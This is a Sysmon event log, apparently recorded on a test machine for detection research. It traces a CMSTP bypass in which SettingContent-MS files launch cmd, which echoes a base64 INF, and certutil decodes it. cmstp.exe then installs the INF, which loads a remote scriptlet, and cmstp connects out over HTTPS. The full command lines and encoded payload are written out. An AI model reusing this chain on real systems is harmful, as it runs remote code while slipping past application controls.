@@ -1,0 +1,533 @@
+﻿<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<Events><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:31:28.783040400Z'/><EventRecordID>37383</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='2984'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:31:21.225</Data><Data Name='ProcessGuid'>{49926e27-1eee-5dcd-0000-001024252b01}</Data><Data Name='ProcessId'>6924</Data><Data Name='Image'>C:\Windows\SysWOW64\cmstp.exe</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.10.1.206</Data><Data Name='SourceHostname'>WinDev1910Eval</Data><Data Name='SourcePort'>50036</Data><Data Name='SourcePortName'></Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>151.101.0.133</Data><Data Name='DestinationHostname'></Data><Data Name='DestinationPort'>443</Data><Data Name='DestinationPortName'>https</Data></EventData><RenderingInfo Culture='en-US'><Message>Network connection detected:
+RuleName: 
+UtcTime: 2019-11-14 09:31:21.225
+ProcessGuid: {49926e27-1eee-5dcd-0000-001024252b01}
+ProcessId: 6924
+Image: C:\Windows\SysWOW64\cmstp.exe
+User: WINDEV1910EVAL\User
+Protocol: tcp
+Initiated: true
+SourceIsIpv6: false
+SourceIp: 10.10.1.206
+SourceHostname: WinDev1910Eval
+SourcePort: 50036
+SourcePortName: 
+DestinationIsIpv6: false
+DestinationIp: 151.101.0.133
+DestinationHostname: 
+DestinationPort: 443
+DestinationPortName: https</Message><Level>Information</Level><Task>Network connection detected (rule: NetworkConnect)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:31:27.151949500Z'/><EventRecordID>37382</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2019-11-14 09:31:27.136</Data><Data Name='ProcessGuid'>{49926e27-1eee-5dcd-0000-001024252b01}</Data><Data Name='ProcessId'>6924</Data><Data Name='Image'>C:\Windows\SysWOW64\cmstp.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL</Data></EventData><RenderingInfo Culture='en-US'><Message>Registry object added or deleted:
+RuleName: 
+EventType: CreateKey
+UtcTime: 2019-11-14 09:31:27.136
+ProcessGuid: {49926e27-1eee-5dcd-0000-001024252b01}
+ProcessId: 6924
+Image: C:\Windows\SysWOW64\cmstp.exe
+TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL</Message><Level>Information</Level><Task>Registry object added or deleted (rule: RegistryEvent)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:31:26.752365600Z'/><EventRecordID>37381</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:31:26.719</Data><Data Name='ProcessGuid'>{49926e27-1eee-5dcd-0000-001024252b01}</Data><Data Name='ProcessId'>6924</Data><Data Name='Image'>C:\Windows\SysWOW64\cmstp.exe</Data><Data Name='FileVersion'>7.2.18362.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Microsoft Connection Manager Profile Installer</Data><Data Name='Product'>Microsoft(R) Connection Manager</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CMSTP.EXE</Data><Data Name='CommandLine'>cmstp.exe  /s C:\Users\User\AppData\Roaming\dvpn.inf</Data><Data Name='CurrentDirectory'>C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020e1530300}</Data><Data Name='LogonId'>0x353e1</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=38F56B0A8593115BFC33185409E734E5,SHA256=395EDCF5709703FD2531844BB16019BBF3F106BB41F74856ACD52AD837F11184</Data><Data Name='ParentProcessGuid'>{49926e27-1eee-5dcd-0000-001085132b01}</Data><Data Name='ParentProcessId'>6176</Data><Data Name='ParentImage'>C:\Windows\SysWOW64\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\cmd.exe" /C cmstp.exe /s %APPDATA%\dvpn.inf</Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:31:26.719
+ProcessGuid: {49926e27-1eee-5dcd-0000-001024252b01}
+ProcessId: 6924
+Image: C:\Windows\SysWOW64\cmstp.exe
+FileVersion: 7.2.18362.1 (WinBuild.160101.0800)
+Description: Microsoft Connection Manager Profile Installer
+Product: Microsoft(R) Connection Manager
+Company: Microsoft Corporation
+OriginalFileName: CMSTP.EXE
+CommandLine: cmstp.exe  /s C:\Users\User\AppData\Roaming\dvpn.inf
+CurrentDirectory: C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020e1530300}
+LogonId: 0x353E1
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=38F56B0A8593115BFC33185409E734E5,SHA256=395EDCF5709703FD2531844BB16019BBF3F106BB41F74856ACD52AD837F11184
+ParentProcessGuid: {49926e27-1eee-5dcd-0000-001085132b01}
+ParentProcessId: 6176
+ParentImage: C:\Windows\SysWOW64\cmd.exe
+ParentCommandLine: "C:\Windows\System32\cmd.exe" /C cmstp.exe /s %APPDATA%\dvpn.inf</Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:31:26.437183300Z'/><EventRecordID>37380</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:31:26.374</Data><Data Name='ProcessGuid'>{49926e27-1eee-5dcd-0000-001085132b01}</Data><Data Name='ProcessId'>6176</Data><Data Name='Image'>C:\Windows\SysWOW64\cmd.exe</Data><Data Name='FileVersion'>10.0.18362.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"C:\Windows\System32\cmd.exe" /C cmstp.exe /s %%APPDATA%%\dvpn.inf</Data><Data Name='CurrentDirectory'>C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020e1530300}</Data><Data Name='LogonId'>0x353e1</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=4943BA1A9B41D69643F69685E35B2943,SHA256=6AEEA6272E1C304D1B8907B9258513AA27CF2F35F10B76365CA8567CABB70459</Data><Data Name='ParentProcessGuid'>{49926e27-1eed-5dcd-0000-001035ef2a01}</Data><Data Name='ParentProcessId'>5600</Data><Data Name='ParentImage'>C:\Users\User\AppData\Roaming\scmwrap.exe</Data><Data Name='ParentCommandLine'>"C:\Users\User\AppData\Roaming\scmwrap.exe" "C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\exec.SettingContent-MS"</Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:31:26.374
+ProcessGuid: {49926e27-1eee-5dcd-0000-001085132b01}
+ProcessId: 6176
+Image: C:\Windows\SysWOW64\cmd.exe
+FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
+Description: Windows Command Processor
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
+CommandLine: "C:\Windows\System32\cmd.exe" /C cmstp.exe /s %%APPDATA%%\dvpn.inf
+CurrentDirectory: C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020e1530300}
+LogonId: 0x353E1
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=4943BA1A9B41D69643F69685E35B2943,SHA256=6AEEA6272E1C304D1B8907B9258513AA27CF2F35F10B76365CA8567CABB70459
+ParentProcessGuid: {49926e27-1eed-5dcd-0000-001035ef2a01}
+ParentProcessId: 5600
+ParentImage: C:\Users\User\AppData\Roaming\scmwrap.exe
+ParentCommandLine: "C:\Users\User\AppData\Roaming\scmwrap.exe" "C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\exec.SettingContent-MS"</Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:31:25.498337900Z'/><EventRecordID>37379</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:31:25.386</Data><Data Name='ProcessGuid'>{49926e27-1eed-5dcd-0000-001035ef2a01}</Data><Data Name='ProcessId'>5600</Data><Data Name='Image'>C:\Users\User\AppData\Roaming\scmwrap.exe</Data><Data Name='FileVersion'>1.0.6781.17559</Data><Data Name='Description'>test1</Data><Data Name='Product'>test1</Data><Data Name='Company'>?</Data><Data Name='OriginalFileName'>scmwrap.exe</Data><Data Name='CommandLine'>"C:\Users\User\AppData\Roaming\scmwrap.exe" "C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\exec.SettingContent-MS"</Data><Data Name='CurrentDirectory'>C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020e1530300}</Data><Data Name='LogonId'>0x353e1</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=C8459BCF5F36F7EFC628F24896E529FB,SHA256=15ACC8794F72021C3DB7DA73BB9D27324A182CF85DABE5EA107B87254C20FE90</Data><Data Name='ParentProcessGuid'>{49926e27-fe01-5dcc-0000-0010f9490400}</Data><Data Name='ParentProcessId'>3468</Data><Data Name='ParentImage'>C:\Windows\explorer.exe</Data><Data Name='ParentCommandLine'>C:\Windows\Explorer.EXE</Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:31:25.386
+ProcessGuid: {49926e27-1eed-5dcd-0000-001035ef2a01}
+ProcessId: 5600
+Image: C:\Users\User\AppData\Roaming\scmwrap.exe
+FileVersion: 1.0.6781.17559
+Description: test1
+Product: test1
+Company: ?
+OriginalFileName: scmwrap.exe
+CommandLine: "C:\Users\User\AppData\Roaming\scmwrap.exe" "C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\exec.SettingContent-MS"
+CurrentDirectory: C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020e1530300}
+LogonId: 0x353E1
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=C8459BCF5F36F7EFC628F24896E529FB,SHA256=15ACC8794F72021C3DB7DA73BB9D27324A182CF85DABE5EA107B87254C20FE90
+ParentProcessGuid: {49926e27-fe01-5dcc-0000-0010f9490400}
+ParentProcessId: 3468
+ParentImage: C:\Windows\explorer.exe
+ParentCommandLine: C:\Windows\Explorer.EXE</Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:31:24.863857600Z'/><EventRecordID>37378</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:31:24.840</Data><Data Name='ProcessGuid'>{49926e27-1eec-5dcd-0000-001016dd2a01}</Data><Data Name='ProcessId'>7680</Data><Data Name='Image'>C:\Windows\SysWOW64\certutil.exe</Data><Data Name='FileVersion'>10.0.18362.1 (WinBuild.160101.0800)</Data><Data Name='Description'>CertUtil.exe</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CertUtil.exe</Data><Data Name='CommandLine'>certutil  -decode C:\Users\User\AppData\Roaming\tmp.b64 C:\Users\User\AppData\Roaming\dvpn.inf</Data><Data Name='CurrentDirectory'>C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020e1530300}</Data><Data Name='LogonId'>0x353e1</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=46B60DBFFA3D5E1D6647E47B29EF7F69,SHA256=484851169C45B1324B6DEDEABD0DF73472B69011DE5042A88A377BE471F7556C</Data><Data Name='ParentProcessGuid'>{49926e27-1eec-5dcd-0000-001013cb2a01}</Data><Data Name='ParentProcessId'>2196</Data><Data Name='ParentImage'>C:\Windows\SysWOW64\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\cmd.exe" /C certutil -decode %APPDATA%\tmp.b64 %APPDATA%\dvpn.inf</Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:31:24.840
+ProcessGuid: {49926e27-1eec-5dcd-0000-001016dd2a01}
+ProcessId: 7680
+Image: C:\Windows\SysWOW64\certutil.exe
+FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
+Description: CertUtil.exe
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: CertUtil.exe
+CommandLine: certutil  -decode C:\Users\User\AppData\Roaming\tmp.b64 C:\Users\User\AppData\Roaming\dvpn.inf
+CurrentDirectory: C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020e1530300}
+LogonId: 0x353E1
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=46B60DBFFA3D5E1D6647E47B29EF7F69,SHA256=484851169C45B1324B6DEDEABD0DF73472B69011DE5042A88A377BE471F7556C
+ParentProcessGuid: {49926e27-1eec-5dcd-0000-001013cb2a01}
+ParentProcessId: 2196
+ParentImage: C:\Windows\SysWOW64\cmd.exe
+ParentCommandLine: "C:\Windows\System32\cmd.exe" /C certutil -decode %APPDATA%\tmp.b64 %APPDATA%\dvpn.inf</Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:31:24.402139000Z'/><EventRecordID>37377</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:31:24.367</Data><Data Name='ProcessGuid'>{49926e27-1eec-5dcd-0000-001013cb2a01}</Data><Data Name='ProcessId'>2196</Data><Data Name='Image'>C:\Windows\SysWOW64\cmd.exe</Data><Data Name='FileVersion'>10.0.18362.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"C:\Windows\System32\cmd.exe" /C certutil -decode %%APPDATA%%\tmp.b64 %%APPDATA%%\dvpn.inf</Data><Data Name='CurrentDirectory'>C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020e1530300}</Data><Data Name='LogonId'>0x353e1</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=4943BA1A9B41D69643F69685E35B2943,SHA256=6AEEA6272E1C304D1B8907B9258513AA27CF2F35F10B76365CA8567CABB70459</Data><Data Name='ParentProcessGuid'>{49926e27-1eeb-5dcd-0000-0010f0a72a01}</Data><Data Name='ParentProcessId'>8056</Data><Data Name='ParentImage'>C:\Users\User\AppData\Roaming\scmwrap.exe</Data><Data Name='ParentCommandLine'>"C:\Users\User\AppData\Roaming\scmwrap.exe" "C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\decode.SettingContent-MS"</Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:31:24.367
+ProcessGuid: {49926e27-1eec-5dcd-0000-001013cb2a01}
+ProcessId: 2196
+Image: C:\Windows\SysWOW64\cmd.exe
+FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
+Description: Windows Command Processor
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
+CommandLine: "C:\Windows\System32\cmd.exe" /C certutil -decode %%APPDATA%%\tmp.b64 %%APPDATA%%\dvpn.inf
+CurrentDirectory: C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020e1530300}
+LogonId: 0x353E1
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=4943BA1A9B41D69643F69685E35B2943,SHA256=6AEEA6272E1C304D1B8907B9258513AA27CF2F35F10B76365CA8567CABB70459
+ParentProcessGuid: {49926e27-1eeb-5dcd-0000-0010f0a72a01}
+ParentProcessId: 8056
+ParentImage: C:\Users\User\AppData\Roaming\scmwrap.exe
+ParentCommandLine: "C:\Users\User\AppData\Roaming\scmwrap.exe" "C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\decode.SettingContent-MS"</Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:31:23.585026900Z'/><EventRecordID>37376</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:31:23.491</Data><Data Name='ProcessGuid'>{49926e27-1eeb-5dcd-0000-0010f0a72a01}</Data><Data Name='ProcessId'>8056</Data><Data Name='Image'>C:\Users\User\AppData\Roaming\scmwrap.exe</Data><Data Name='FileVersion'>1.0.6781.17559</Data><Data Name='Description'>test1</Data><Data Name='Product'>test1</Data><Data Name='Company'>?</Data><Data Name='OriginalFileName'>scmwrap.exe</Data><Data Name='CommandLine'>"C:\Users\User\AppData\Roaming\scmwrap.exe" "C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\decode.SettingContent-MS"</Data><Data Name='CurrentDirectory'>C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020e1530300}</Data><Data Name='LogonId'>0x353e1</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=C8459BCF5F36F7EFC628F24896E529FB,SHA256=15ACC8794F72021C3DB7DA73BB9D27324A182CF85DABE5EA107B87254C20FE90</Data><Data Name='ParentProcessGuid'>{49926e27-fe01-5dcc-0000-0010f9490400}</Data><Data Name='ParentProcessId'>3468</Data><Data Name='ParentImage'>C:\Windows\explorer.exe</Data><Data Name='ParentCommandLine'>C:\Windows\Explorer.EXE</Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:31:23.491
+ProcessGuid: {49926e27-1eeb-5dcd-0000-0010f0a72a01}
+ProcessId: 8056
+Image: C:\Users\User\AppData\Roaming\scmwrap.exe
+FileVersion: 1.0.6781.17559
+Description: test1
+Product: test1
+Company: ?
+OriginalFileName: scmwrap.exe
+CommandLine: "C:\Users\User\AppData\Roaming\scmwrap.exe" "C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\decode.SettingContent-MS"
+CurrentDirectory: C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020e1530300}
+LogonId: 0x353E1
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=C8459BCF5F36F7EFC628F24896E529FB,SHA256=15ACC8794F72021C3DB7DA73BB9D27324A182CF85DABE5EA107B87254C20FE90
+ParentProcessGuid: {49926e27-fe01-5dcc-0000-0010f9490400}
+ParentProcessId: 3468
+ParentImage: C:\Windows\explorer.exe
+ParentCommandLine: C:\Windows\Explorer.EXE</Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:31:22.328443100Z'/><EventRecordID>37375</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:31:22.030</Data><Data Name='ProcessGuid'>{49926e27-1eea-5dcd-0000-0010eb862a01}</Data><Data Name='ProcessId'>8164</Data><Data Name='Image'>C:\Windows\SysWOW64\cmd.exe</Data><Data Name='FileVersion'>10.0.18362.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"C:\Windows\System32\cmd.exe" /C echo W3ZlcnNpb25dClNpZ25hdHVyZT0kY2hpY2FnbyQKQWR2YW5jZWRJTkY9Mi41CgpbRGVmYXVsdEluc3RhbGxfU2luZ2xlVXNlcl0KVW5SZWdpc3Rlck9DWHM9VW5SZWdpc3Rlck9DWFNlY3Rpb24KCltVblJlZ2lzdGVyT0NYU2VjdGlvbl0KJTExJVxzY3JvYmouZGxsLE5JLGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9NYXJpYVZ1bGthbi9DTVNUUC9tYXN0ZXIvZHZwbi5zY3QKCltTdHJpbmdzXQpBcHBBY3QgPSAiU09GVFdBUkVcTWljcm9zb2Z0XENvbm5lY3Rpb24gTWFuYWdlciIKU2VydmljZU5hbWU9IkRWUE4iClNob3J0U3ZjTmFtZT0iRFZQTiIK &gt; %%APPDATA%%\tmp.b64</Data><Data Name='CurrentDirectory'>C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020e1530300}</Data><Data Name='LogonId'>0x353e1</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=4943BA1A9B41D69643F69685E35B2943,SHA256=6AEEA6272E1C304D1B8907B9258513AA27CF2F35F10B76365CA8567CABB70459</Data><Data Name='ParentProcessGuid'>{49926e27-1ee8-5dcd-0000-0010f7582a01}</Data><Data Name='ParentProcessId'>5784</Data><Data Name='ParentImage'>C:\Users\User\AppData\Roaming\scmwrap.exe</Data><Data Name='ParentCommandLine'>"C:\Users\User\AppData\Roaming\scmwrap.exe" "C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\echo.SettingContent-MS"</Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:31:22.030
+ProcessGuid: {49926e27-1eea-5dcd-0000-0010eb862a01}
+ProcessId: 8164
+Image: C:\Windows\SysWOW64\cmd.exe
+FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
+Description: Windows Command Processor
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
